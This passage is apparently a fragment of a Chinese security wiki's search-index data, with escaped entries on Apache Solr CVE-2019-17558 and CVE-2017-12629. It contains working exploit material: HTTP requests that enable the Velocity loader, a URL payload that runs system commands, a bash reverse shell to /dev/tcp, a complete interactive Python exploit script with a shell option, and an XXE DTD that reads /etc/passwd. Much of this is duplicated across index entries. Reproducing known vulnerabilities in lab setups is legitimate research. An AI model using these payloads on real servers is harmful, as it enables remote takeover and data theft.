\u5982\u679cshell\u6216dnslog\u65e0\u53cd\u5e94\uff0c\u53ef\u4ee5\u9009\u62e9\u66f4\u6539\u4e00\u4e0bPOC\u7684\u90e8\u5206\u53c2\u6570\u6267\u884c\u9700\u8981\u7684\u4ee3\u7801","title":"\u6f0f\u6d1e\u5229\u7528POC"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Solr/Apache%20Solr%20RCE%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2017-12629/#\u53c2\u8003\u6587\u7ae0","text":"Apache Solr\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\uff08CVE-2017-12629\uff09\u4ece\u5229\u7528\u5230\u5165\u4fb5\u68c0\u6d4b cve-2017-12629 apache solr xxe & rce \u6f0f\u6d1e\u5206\u6790","title":"\u53c2\u8003\u6587\u7ae0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Solr/Apache%20Solr%20Velocity%E6%A8%A1%E6%9D%BF%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%20CVE-2019-17558/","text":"Apache Solr Velocity\u6a21\u677f\u8fdc\u7a0b\u6267\u884c CVE-2019-17558 \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 2019\u5e7410\u6708\u672b\uff0cGitHub\u4ee3\u7801\u4e2d\u5b89\u5168\u7814\u7a76\u5458S00pY\u53d1\u5e03\u4e00\u4e2aApache Solr Velocity\u6a21\u7248\u6ce8\u5165\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u7684POC\uff0c\u53d1\u73b0\u7f51\u7edc\u4e0a\u51fa\u73b0\u9488\u5bf9Apache Solr\u670d\u52a1\u5668\u7684\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\u3002\u8be5\u6f0f\u6d1e\u662f\u7531\u4e8eVelocity\u6a21\u677f\u5b58\u5728\u6ce8\u5165\u6240\u81f4\uff08Velocity\u662f\u4e00\u4e2a\u57fa\u4e8eJava\u7684\u6a21\u677f\u5f15\u64ce\uff0c\u53ef\u8ba9\u4f7f\u7528\u8005\u901a\u8fc7\u6a21\u677f\u8bed\u8a00\u5f15\u7528Java\u4e2d\u5b9a\u4e49\u7684\u5bf9\u8c61\uff09\u3002\u653b\u51fb\u8005\u5728\u77e5\u9053Solr\u670d\u52a1\u5668\u4e0aCore\u540d\u79f0\u540e\uff0c\u5148\u628a params.resource.loader.enabled \u8bbe\u7f6e\u4e3atrue\uff08\u5c31\u53ef\u52a0\u8f7d\u6307\u5b9a\u8d44\u6e90\uff09\uff0c\u518d\u8fdb\u884c\u8fdc\u7a0b\u6267\u884c\u547d\u4ee4\u3002 \u5f71\u54cd\u7248\u672c \u00b6 [!NOTE] Apache Solr 5.x \u81f3 8.2.0 \u73af\u5883\u642d\u5efa \u00b6 https://github.com/vulhub/vulhub.git cd vulhub/solr/CVE-2019-17558 docker-compose build docker-compose up -d # \u521b\u5efa\u4e00\u4e2asolr\u6838\u5fc3test docker-compose exec solr bash bin/solr create_core -c test -d example/example-DIH/solr/db \u8bbf\u95ee http://xxx.xxx.xxx.xxx:8983/solr/ \u6b63\u5e38\u5373\u53ef \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u6253\u5f00\u540e\u83b7\u53d6 Core \u4fe1\u606f \u5f97\u77e5 test \u8fd9\u4e2a Core \u5b58\u5728 \u8bbf\u95ee http://xxx.xxx.xxx.xxx:8983/solr/test/config \u6b63\u5e38 \u8bbf\u95eeCore\u7684config\u914d\u7f6e\u4fe1\u606f\u65f6\uff0c\u901a\u8fc7POST\u8bf7\u6c42\u628a{% em type=\"red\" %}params.resource.loader.enabled{% endem %}\u8bbe\u7f6e\u4e3a True\uff0c\u518d\u901a\u8fc7\u7cbe\u5fc3\u6784\u9020\u7684get\u8bf7\u6c42\u5373\u53efRCE\uff0c\u6b64\u65f6\u7528\u6237\u5c31\u53ef\u4ee5\u52a0\u8f7d\u6307\u5b9a\u8d44\u6e90\uff0c\u6784\u9020\u4e00\u4e2a\u80fd\u6267\u884c\u547d\u4ee4\u7684\u6076\u610f\u8bf7\u6c42 \u8bbe\u7f6eparams.resource.loader.enabled\u4e3aTrue \u00b6 POST /solr/test/config HTTP/1.1 Host: xxx.xxx.xxx.xxx:8983 Pragma: no-cache Cache-Control: no-cache Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 ( X11 ; Linux x86_64 ) AppleWebKit/537.36 ( KHTML, like Gecko ) Chrome/86.0.4240.111 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml ; q = 0 .9,image/avif,image/webp,image/apng,*/* ; q = 0 .8,application/signed-exchange ; v = b3 ; q = 0 .9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh ; q = 0 .9,en-US ; q = 0 .8,en ; q = 0 .7,zh-TW ; q = 0 .6 Connection: close Content-Length: 259 { \"update-queryresponsewriter\" : { \"startup\" : \"lazy\" , \"name\" : \"velocity\" , \"class\" : \"solr.VelocityResponseWriter\" , \"template.base.dir\" : \"\" , \"solr.resource.loader.enabled\" : \"true\" , \"params.resource.loader.enabled\" : \"true\" } } \u547d\u4ee4\u6267\u884c \u00b6 \u518d\u4f7f\u7528POC\u9020\u6210\u547d\u4ee4\u6267\u884c http://xxx.xxx.xxx.xxx:8983/solr/test/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=\"\")+%23set($rt=$x.class.forName(\"java.lang.Runtime\"))+%23set($chr=$x.class.forName('java.lang.Character'))+%23set($str=$x.class.forName(\"java.lang.String\"))+%23set($ex=$rt.getRuntime().exec(\"whoami\"))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end \u53cd\u5f39hell\uff0c\u56e0\u4e3a\u90e8\u5206\u547d\u4ee4\u4f1a\u88ab\u8fc7\u6ee4\u5bfc\u81f4\u8fd4\u56de Error 500 \uff0c\u6240\u4ee5\u53cd\u5f39shell\u9700\u8981\u7528\u53e6\u5916\u7684\u53cd\u5f39shell\u65b9\u6cd5 POC : /bin/bash -c $@|bash 0 echo bash -i >& /dev/tcp/xxx.xxx.xxx.xxx:9999 0>&1 POC\u9700\u8981Urlencoding\u8fdb\u884c\u7f16\u7801\u624d\u80fd\u7ed5\u8fc7 POC \uff1a %2Fbin%2Fbash%20-c%20%24%40%7Cbash%200%20echo%20bash%20-i%20%3E%26%2Fdev%2Ftcp%2F{IP}%2F{PORT}%200%3E%261 \u6f0f\u6d1e\u5229\u7528POC \u00b6 #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import requests import sys import json def title (): print ( '+------------------------------------------' ) print ( '+ \\033 [34mPOC_Des: http://wiki.peiqi.tech \\033 [0m' ) print ( '+ \\033 [34mGithub : https://github.com/PeiQi0 \\033 [0m' ) print ( '+ \\033 [34m\u516c\u4f17\u53f7 : PeiQi\u6587\u5e93 \\033 [0m' ) print ( '+ \\033 [34mVersion: Apache Solr 5.0.0 - 8.3.1 \\033 [0m' ) print ( '+ \\033 [36m\u4f7f\u7528\u683c\u5f0f: python3 cve-2019-17558.py \\033 [0m' ) print ( '+ \\033 [36mUrl >>> http://xxx.xxx.xxx.xxx:8983 \\033 [0m' ) print ( '+ \\033 [36mCmd >>> whoami(\u547d\u4ee4\u6267\u884c) \\033 [0m' ) print ( '+ \\033 [36mCmd >>> shell(\u53cd\u5f39shell) \\033 [0m' ) print ( '+------------------------------------------' ) def POC_1 ( target_url ): core_url = target_url + \"/solr/admin/cores?indexInfo=false&wt=json\" try : response = requests . request ( \"GET\" , url = core_url , timeout = 10 ) core_name = list ( json . loads ( response . text )[ \"status\" ])[ 0 ] print ( \" \\033 [32m[o] \u6210\u529f\u83b7\u5f97core_name,Url\u4e3a\uff1a\" + target_url + \"/solr/\" + core_name + \"/config \\033 [0m\" ) return core_name except : print ( \" \\033 [31m[x] \u76ee\u6807Url\u6f0f\u6d1e\u5229\u7528\u5931\u8d25 \\033 [0m\" ) sys . exit ( 0 ) def POC_2 ( target_url , core_name ): open_params = target_url + \"/solr/\" + core_name + \"/config\" headers = { \"Content-Type\" : \"application/json\" , \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" } set_api_data = \"\"\" { \"update-queryresponsewriter\": { \"startup\": \"lazy\", \"name\": \"velocity\", \"class\": \"solr.VelocityResponseWriter\", \"template.base.dir\": \"\", \"solr.resource.loader.enabled\": \"true\", \"params.resource.loader.enabled\": \"true\" } } \"\"\" response = requests . request ( \"POST\" , url = open_params , data = set_api_data , headers = headers , timeout = 10 ) if response . status_code == 200 : print ( \" \\033 [32m[o] POST\u8bf7\u6c42\u6210\u529f\u5c06params.resource.loader.enabled\u8bbe\u7f6e\u4e3aTrue \\033 [0m\" ) else : print ( \" \\033 [31m[x] POST\u8bf7\u6c42params.resource.loader.enabled\u8bbe\u7f6e\u4e3aTrue\u5931\u8d25 \\033 [0m\" ) sys . exit ( 0 ) def POC_3 ( target_url , core_name , cmd ): vnul_url = target_url + \"/solr/\" + core_name + \"/select?q=1&&wt=velocity&v.template=custom&v.template.custom= %23s et($x= %27% 27)+ %23s et($rt=$x.class.forName(%27java.lang.Runtime%27))+ %23s et($chr=$x.class.forName(%27java.lang.Character%27))+ %23s et($str=$x.class.forName(%27java.lang.String%27))+ %23s et($ex=$rt.getRuntime().exec(%27\" + cmd + \"%27))+$ex.waitFor()+ %23s et($out=$ex.getInputStream())+ %23f oreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read())) %23e nd\" headers = { \"Content-Type\" : \"application/json\" , \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" } response = requests . request ( \"GET\" , url = vnul_url , headers = headers , timeout = 10 ) if \"Error 500\" in response . text : print ( \" \\033 [31m[x] \u4ee3\u7801\u6267\u884c\u5931\u8d25\uff0c\u54cd\u5e94\u4e3a Error 500 \\033 [0m\" ) else : print ( \" \\033 [32m[o] \u6f0f\u6d1e\u6210\u529f\u5229\u7528,\u54cd\u5e94\u4e3a \\n \\033 [0m\" , response . text ) def POC_4 ( target_url , core_name , IP , POST ): # POC : /bin/bash -c $@|bash 0 echo bash -i >& /dev/tcp/xxx.xxx.xxx.xxx:9999 0>&1 cmd = \" %2F bin %2F bash%20-c %20% 24 %40% 7Cbash %200% 20echo%20bash%20-i %20% 3E %26% 2Fdev %2F tcp %2F{}%2F{}%200% 3E%261\" . format ( IP , POST ) vnul_url = target_url + \"/solr/\" + core_name + \"/select?q=1&&wt=velocity&v.template=custom&v.template.custom= %23s et($x= %27% 27)+ %23s et($rt=$x.class.forName(%27java.lang.Runtime%27))+ %23s et($chr=$x.class.forName(%27java.lang.Character%27))+ %23s et($str=$x.class.forName(%27java.lang.String%27))+ %23s et($ex=$rt.getRuntime().exec(%27\" + cmd + \"%27))+$ex.waitFor()+ %23s et($out=$ex.getInputStream())+ %23f oreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read())) %23e nd\" headers = { \"Content-Type\" : \"application/json\" , \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" } response = requests . request ( \"GET\" , url = vnul_url , headers = headers ) if __name__ == \"__main__\" : title () target_url = str ( input ( \" \\033 [35mPlease input Attack Url \\n Url >>> \\033 [0m\" )) core_name = POC_1 ( target_url ) POC_2 ( target_url , core_name ) while True : cmd = input ( \" \\033 [35mCmd >>> \\033 [0m\" ) if cmd == \"exit\" : exit ( 0 ) elif cmd == \"shell\" : IP = str ( input ( \" \\033 [35m\u8bf7\u8f93\u5165\u76d1\u542cIP >>> \\033 [0m\" )) PORT = str ( input ( \" \\033 [35m\u8bf7\u8f93\u5165\u76d1\u542cPORT >>> \\033 [0m\" )) POC_4 ( target_url , core_name , IP , PORT ) else : POC_3 ( target_url , core_name , cmd )","title":"Apache Solr Velocity\u6a21\u677f\u8fdc\u7a0b\u6267\u884c CVE-2019-17558"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Solr/Apache%20Solr%20Velocity%E6%A8%A1%E6%9D%BF%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%20CVE-2019-17558/#apache-solr-velocity\u6a21\u677f\u8fdc\u7a0b\u6267\u884c-cve-2019-17558","text":"","title":"Apache Solr Velocity\u6a21\u677f\u8fdc\u7a0b\u6267\u884c CVE-2019-17558"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Solr/Apache%20Solr%20Velocity%E6%A8%A1%E6%9D%BF%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%20CVE-2019-17558/#\u6f0f\u6d1e\u63cf\u8ff0","text":"2019\u5e7410\u6708\u672b\uff0cGitHub\u4ee3\u7801\u4e2d\u5b89\u5168\u7814\u7a76\u5458S00pY\u53d1\u5e03\u4e00\u4e2aApache Solr Velocity\u6a21\u7248\u6ce8\u5165\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u7684POC\uff0c\u53d1\u73b0\u7f51\u7edc\u4e0a\u51fa\u73b0\u9488\u5bf9Apache Solr\u670d\u52a1\u5668\u7684\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\u3002\u8be5\u6f0f\u6d1e\u662f\u7531\u4e8eVelocity\u6a21\u677f\u5b58\u5728\u6ce8\u5165\u6240\u81f4\uff08Velocity\u662f\u4e00\u4e2a\u57fa\u4e8eJava\u7684\u6a21\u677f\u5f15\u64ce\uff0c\u53ef\u8ba9\u4f7f\u7528\u8005\u901a\u8fc7\u6a21\u677f\u8bed\u8a00\u5f15\u7528Java\u4e2d\u5b9a\u4e49\u7684\u5bf9\u8c61\uff09\u3002\u653b\u51fb\u8005\u5728\u77e5\u9053Solr\u670d\u52a1\u5668\u4e0aCore\u540d\u79f0\u540e\uff0c\u5148\u628a params.resource.loader.enabled \u8bbe\u7f6e\u4e3atrue\uff08\u5c31\u53ef\u52a0\u8f7d\u6307\u5b9a\u8d44\u6e90\uff09\uff0c\u518d\u8fdb\u884c\u8fdc\u7a0b\u6267\u884c\u547d\u4ee4\u3002","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Solr/Apache%20Solr%20Velocity%E6%A8%A1%E6%9D%BF%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%20CVE-2019-17558/#\u5f71\u54cd\u7248\u672c","text":"[!NOTE] Apache Solr 5.x \u81f3 8.2.0","title":"\u5f71\u54cd\u7248\u672c"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Solr/Apache%20Solr%20Velocity%E6%A8%A1%E6%9D%BF%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%20CVE-2019-17558/#\u73af\u5883\u642d\u5efa","text":"https://github.com/vulhub/vulhub.git cd vulhub/solr/CVE-2019-17558 docker-compose build docker-compose up -d # \u521b\u5efa\u4e00\u4e2asolr\u6838\u5fc3test docker-compose exec solr bash bin/solr create_core -c test -d example/example-DIH/solr/db \u8bbf\u95ee http://xxx.xxx.xxx.xxx:8983/solr/ \u6b63\u5e38\u5373\u53ef","title":"\u73af\u5883\u642d\u5efa"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Solr/Apache%20Solr%20Velocity%E6%A8%A1%E6%9D%BF%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%20CVE-2019-17558/#\u6f0f\u6d1e\u590d\u73b0","text":"\u6253\u5f00\u540e\u83b7\u53d6 Core \u4fe1\u606f \u5f97\u77e5 test \u8fd9\u4e2a Core \u5b58\u5728 \u8bbf\u95ee http://xxx.xxx.xxx.xxx:8983/solr/test/config \u6b63\u5e38 \u8bbf\u95eeCore\u7684config\u914d\u7f6e\u4fe1\u606f\u65f6\uff0c\u901a\u8fc7POST\u8bf7\u6c42\u628a{% em type=\"red\" %}params.resource.loader.enabled{% endem %}\u8bbe\u7f6e\u4e3a True\uff0c\u518d\u901a\u8fc7\u7cbe\u5fc3\u6784\u9020\u7684get\u8bf7\u6c42\u5373\u53efRCE\uff0c\u6b64\u65f6\u7528\u6237\u5c31\u53ef\u4ee5\u52a0\u8f7d\u6307\u5b9a\u8d44\u6e90\uff0c\u6784\u9020\u4e00\u4e2a\u80fd\u6267\u884c\u547d\u4ee4\u7684\u6076\u610f\u8bf7\u6c42","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Solr/Apache%20Solr%20Velocity%E6%A8%A1%E6%9D%BF%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%20CVE-2019-17558/#\u8bbe\u7f6eparamsresourceloaderenabled\u4e3atrue","text":"POST /solr/test/config HTTP/1.1 Host: xxx.xxx.xxx.xxx:8983 Pragma: no-cache Cache-Control: no-cache Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 ( X11 ; Linux x86_64 ) AppleWebKit/537.36 ( KHTML, like Gecko ) Chrome/86.0.4240.111 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml ; q = 0 .9,image/avif,image/webp,image/apng,*/* ; q = 0 .8,application/signed-exchange ; v = b3 ; q = 0 .9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh ; q = 0 .9,en-US ; q = 0 .8,en ; q = 0 .7,zh-TW ; q = 0 .6 Connection: close Content-Length: 259 { \"update-queryresponsewriter\" : { \"startup\" : \"lazy\" , \"name\" : \"velocity\" , \"class\" : \"solr.VelocityResponseWriter\" , \"template.base.dir\" : \"\" , \"solr.resource.loader.enabled\" : \"true\" , \"params.resource.loader.enabled\" : \"true\" } }","title":"\u8bbe\u7f6eparams.resource.loader.enabled\u4e3aTrue"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Solr/Apache%20Solr%20Velocity%E6%A8%A1%E6%9D%BF%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%20CVE-2019-17558/#\u547d\u4ee4\u6267\u884c","text":"\u518d\u4f7f\u7528POC\u9020\u6210\u547d\u4ee4\u6267\u884c http://xxx.xxx.xxx.xxx:8983/solr/test/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=\"\")+%23set($rt=$x.class.forName(\"java.lang.Runtime\"))+%23set($chr=$x.class.forName('java.lang.Character'))+%23set($str=$x.class.forName(\"java.lang.String\"))+%23set($ex=$rt.getRuntime().exec(\"whoami\"))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end \u53cd\u5f39hell\uff0c\u56e0\u4e3a\u90e8\u5206\u547d\u4ee4\u4f1a\u88ab\u8fc7\u6ee4\u5bfc\u81f4\u8fd4\u56de Error 500 \uff0c\u6240\u4ee5\u53cd\u5f39shell\u9700\u8981\u7528\u53e6\u5916\u7684\u53cd\u5f39shell\u65b9\u6cd5 POC : /bin/bash -c $@|bash 0 echo bash -i >& /dev/tcp/xxx.xxx.xxx.xxx:9999 0>&1 POC\u9700\u8981Urlencoding\u8fdb\u884c\u7f16\u7801\u624d\u80fd\u7ed5\u8fc7 POC \uff1a %2Fbin%2Fbash%20-c%20%24%40%7Cbash%200%20echo%20bash%20-i%20%3E%26%2Fdev%2Ftcp%2F{IP}%2F{PORT}%200%3E%261","title":"\u547d\u4ee4\u6267\u884c"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Solr/Apache%20Solr%20Velocity%E6%A8%A1%E6%9D%BF%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%20CVE-2019-17558/#\u6f0f\u6d1e\u5229\u7528poc","text":"#!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import requests import sys import json def title (): print ( '+------------------------------------------' ) print ( '+ \\033 [34mPOC_Des: http://wiki.peiqi.tech \\033 [0m' ) print ( '+ \\033 [34mGithub : https://github.com/PeiQi0 \\033 [0m' ) print ( '+ \\033 [34m\u516c\u4f17\u53f7 : PeiQi\u6587\u5e93 \\033 [0m' ) print ( '+ \\033 [34mVersion: Apache Solr 5.0.0 - 8.3.1 \\033 [0m' ) print ( '+ \\033 [36m\u4f7f\u7528\u683c\u5f0f: python3 cve-2019-17558.py \\033 [0m' ) print ( '+ \\033 [36mUrl >>> http://xxx.xxx.xxx.xxx:8983 \\033 [0m' ) print ( '+ \\033 [36mCmd >>> whoami(\u547d\u4ee4\u6267\u884c) \\033 [0m' ) print ( '+ \\033 [36mCmd >>> shell(\u53cd\u5f39shell) \\033 [0m' ) print ( '+------------------------------------------' ) def POC_1 ( target_url ): core_url = target_url + \"/solr/admin/cores?indexInfo=false&wt=json\" try : response = requests . request ( \"GET\" , url = core_url , timeout = 10 ) core_name = list ( json . loads ( response . text )[ \"status\" ])[ 0 ] print ( \" \\033 [32m[o] \u6210\u529f\u83b7\u5f97core_name,Url\u4e3a\uff1a\" + target_url + \"/solr/\" + core_name + \"/config \\033 [0m\" ) return core_name except : print ( \" \\033 [31m[x] \u76ee\u6807Url\u6f0f\u6d1e\u5229\u7528\u5931\u8d25 \\033 [0m\" ) sys . exit ( 0 ) def POC_2 ( target_url , core_name ): open_params = target_url + \"/solr/\" + core_name + \"/config\" headers = { \"Content-Type\" : \"application/json\" , \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" } set_api_data = \"\"\" { \"update-queryresponsewriter\": { \"startup\": \"lazy\", \"name\": \"velocity\", \"class\": \"solr.VelocityResponseWriter\", \"template.base.dir\": \"\", \"solr.resource.loader.enabled\": \"true\", \"params.resource.loader.enabled\": \"true\" } } \"\"\" response = requests . request ( \"POST\" , url = open_params , data = set_api_data , headers = headers , timeout = 10 ) if response . status_code == 200 : print ( \" \\033 [32m[o] POST\u8bf7\u6c42\u6210\u529f\u5c06params.resource.loader.enabled\u8bbe\u7f6e\u4e3aTrue \\033 [0m\" ) else : print ( \" \\033 [31m[x] POST\u8bf7\u6c42params.resource.loader.enabled\u8bbe\u7f6e\u4e3aTrue\u5931\u8d25 \\033 [0m\" ) sys . exit ( 0 ) def POC_3 ( target_url , core_name , cmd ): vnul_url = target_url + \"/solr/\" + core_name + \"/select?q=1&&wt=velocity&v.template=custom&v.template.custom= %23s et($x= %27% 27)+ %23s et($rt=$x.class.forName(%27java.lang.Runtime%27))+ %23s et($chr=$x.class.forName(%27java.lang.Character%27))+ %23s et($str=$x.class.forName(%27java.lang.String%27))+ %23s et($ex=$rt.getRuntime().exec(%27\" + cmd + \"%27))+$ex.waitFor()+ %23s et($out=$ex.getInputStream())+ %23f oreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read())) %23e nd\" headers = { \"Content-Type\" : \"application/json\" , \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" } response = requests . request ( \"GET\" , url = vnul_url , headers = headers , timeout = 10 ) if \"Error 500\" in response . text : print ( \" \\033 [31m[x] \u4ee3\u7801\u6267\u884c\u5931\u8d25\uff0c\u54cd\u5e94\u4e3a Error 500 \\033 [0m\" ) else : print ( \" \\033 [32m[o] \u6f0f\u6d1e\u6210\u529f\u5229\u7528,\u54cd\u5e94\u4e3a \\n \\033 [0m\" , response . text ) def POC_4 ( target_url , core_name , IP , POST ): # POC : /bin/bash -c $@|bash 0 echo bash -i >& /dev/tcp/xxx.xxx.xxx.xxx:9999 0>&1 cmd = \" %2F bin %2F bash%20-c %20% 24 %40% 7Cbash %200% 20echo%20bash%20-i %20% 3E %26% 2Fdev %2F tcp %2F{}%2F{}%200% 3E%261\" . format ( IP , POST ) vnul_url = target_url + \"/solr/\" + core_name + \"/select?q=1&&wt=velocity&v.template=custom&v.template.custom= %23s et($x= %27% 27)+ %23s et($rt=$x.class.forName(%27java.lang.Runtime%27))+ %23s et($chr=$x.class.forName(%27java.lang.Character%27))+ %23s et($str=$x.class.forName(%27java.lang.String%27))+ %23s et($ex=$rt.getRuntime().exec(%27\" + cmd + \"%27))+$ex.waitFor()+ %23s et($out=$ex.getInputStream())+ %23f oreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read())) %23e nd\" headers = { \"Content-Type\" : \"application/json\" , \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" } response = requests . request ( \"GET\" , url = vnul_url , headers = headers ) if __name__ == \"__main__\" : title () target_url = str ( input ( \" \\033 [35mPlease input Attack Url \\n Url >>> \\033 [0m\" )) core_name = POC_1 ( target_url ) POC_2 ( target_url , core_name ) while True : cmd = input ( \" \\033 [35mCmd >>> \\033 [0m\" ) if cmd == \"exit\" : exit ( 0 ) elif cmd == \"shell\" : IP = str ( input ( \" \\033 [35m\u8bf7\u8f93\u5165\u76d1\u542cIP >>> \\033 [0m\" )) PORT = str ( input ( \" \\033 [35m\u8bf7\u8f93\u5165\u76d1\u542cPORT >>> \\033 [0m\" )) POC_4 ( target_url , core_name , IP , PORT ) else : POC_3 ( target_url , core_name , cmd )","title":"\u6f0f\u6d1e\u5229\u7528POC"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Solr/Apache%20Solr%20XXE%20%E6%BC%8F%E6%B4%9E%20CVE-2017-12629/","text":"Apache Solr XXE \u6f0f\u6d1e CVE-2017-12629 \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 Apache Solr \u662f\u4e00\u4e2a\u5f00\u6e90\u7684\u641c\u7d22\u670d\u52a1\u5668\u3002Solr \u4f7f\u7528 Java \u8bed\u8a00\u5f00\u53d1\uff0c\u4e3b\u8981\u57fa\u4e8e HTTP \u548c Apache Lucene \u5b9e\u73b0\u3002\u539f\u7406\u5927\u81f4\u662f\u6587\u6863\u901a\u8fc7Http\u5229\u7528XML\u52a0\u5230\u4e00\u4e2a\u641c\u7d22\u96c6\u5408\u4e2d\u3002\u67e5\u8be2\u8be5\u96c6\u5408\u4e5f\u662f\u901a\u8fc7 http\u6536\u5230\u4e00\u4e2aXML/JSON\u54cd\u5e94\u6765\u5b9e\u73b0\u3002\u6b64\u6b217.1.0\u4e4b\u524d\u7248\u672c\u603b\u5171\u7206\u51fa\u4e24\u4e2a\u6f0f\u6d1e\uff1aXML\u5b9e\u4f53\u6269\u5c55\u6f0f\u6d1e\uff08XXE\uff09\u548c\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\uff08RCE\uff09\u3002 \u5f71\u54cd\u7248\u672c \u00b6 Apache Solr < 7.1 Apache Lucene < 7. \u73af\u5883\u642d\u5efa \u00b6 https://github.com/vulhub/vulhub.git cd vulhub/solr/CVE-2017-12629-XXE docker-compose build docker-compose up -d \u6f0f\u6d1e\u590d\u73b0 \u00b6 Dnslog \u00b6 \u5148\u8bf7\u6c42url\u5730\u5740\u83b7\u53d6 core \u5185\u5bb9 http://xxx.xxx.xxx.xxx:8983/solr/admin/cores \u8bbf\u95ee http://xxx.xxx.xxx.xxx:8983/solr/demo/select?q={!xmlparser v='<!DOCTYPE a SYSTEM \"http://xxxxx.ceye.io\"><a></a>'}&wt=xml \u67e5\u770bdnslog\u5f97\u5230\u8bf7\u6c42 \u8fdc\u7a0b\u8bfb\u53d6\u6587\u4ef6 \u00b6 \u5728\u81ea\u5df1\u7684\u670d\u52a1\u5668\u4e0a\u5199\u5165\u4e00\u4e2a\u53ef\u8bbf\u95ee\u7684XML\u6587\u4ef6\uff0c\u5185\u5bb9\u5199\u5165 <!ENTITY % file SYSTEM \"file:///etc/passwd\"> <!ENTITY % ent \"<!ENTITY data SYSTEM ':%file;'> \"> 